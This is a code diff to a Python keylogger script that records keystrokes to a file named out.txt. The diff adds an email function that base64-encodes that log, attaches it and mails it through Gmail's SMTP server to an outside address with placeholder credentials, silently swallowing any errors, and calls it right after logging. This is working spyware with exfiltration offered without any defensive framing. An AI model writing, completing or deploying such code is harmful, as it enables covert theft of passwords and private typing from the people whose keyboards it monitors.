@@ -1,6 +1,10 @@
 import keyboard
 import subprocess
 import rsa
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
 
 def encrypt(message: str) -> str:
     (pubkey, privkey) = rsa.newkeys(512)
@@ -23,5 +27,24 @@ def log_keys():
 
     except IOError:
         create_file()
+        
+def email():
+    filename = "out.txt"
+    attachment = open(filename, "rb")
+    part = MIMEBase("application", "octet-stream")
+    part.set_payload((attachment).read())
+    attachment.close()
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", f"attachment; filename= {filename}")
+    message = MIMEMultipart()
+    message.attach(part)
+    try:
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login("username", "password")
+        server.sendmail("an_email@gmail.com", "another_email@gmail.com", message.as_string())
+    except:
+        pass
 
 log_keys()
+email()
